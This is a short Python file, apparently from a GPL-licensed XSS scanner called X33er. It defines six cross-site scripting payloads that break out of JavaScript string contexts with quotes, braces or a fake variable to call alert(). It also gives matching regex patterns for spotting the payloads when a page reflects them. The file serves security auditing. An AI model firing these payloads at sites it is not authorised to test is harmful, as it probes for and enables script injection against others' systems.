#!/usr/bin/env python

"""
Copyright (c) 2013 X33er Project
X33er is free software: you can redistribute it and / or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

X33er is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
@for more information see <http://www.gnu.org/licenses/>
"""

######### Payloads For JavaScriptCode[s] Audit #######

Payloads = {
    "Basic Payload for Breaking code using DoubleQuotes":"\";alert('X33er');\"",
    "Basic Payload for Breaking code using SingleQuotes":"\';alert('X33er');\"",
    "Basic Payload for Breaking code using DoubleQuotes and Brace":'";alert(\'X33er\');("',
    "Basic Payload for Breaking code using SingleQuotes and Brace":"';alert('X33er');('",
    "Basic Payload for Breaking code using DoubleQuotes and Fake variable":'";alert(\'xss\');("");str="',
    "Basic Payload for Breaking code using SingleQuotes and Fake variable":"';alert(\'xss\');();str='"
}

PayloadsPCRE = {
    "Basic Payload for Breaking code using DoubleQuotes":"\";alert\(\'X33er\'\);\"",
    "Basic Payload for Breaking code using SingleQuotes":"\';alert\(\'X33er\'\);\"",
    "Basic Payload for Breaking code using DoubleQuotes and Brace":'\";alert\(\'X33er\'\);\(\"',
    "Basic Payload for Breaking code using SingleQuotes and Brace":"\';alert\(\'X33er\'\);\(\'",
    "Basic Payload for Breaking code using DoubleQuotes and Fake variable":'\";alert\(\'xss\'\);\(\"\"\);str=\"',
    "Basic Payload for Breaking code using SingleQuotes and Fake variable":"\';alert\(\'xss\'\);\(\);str=\'"
}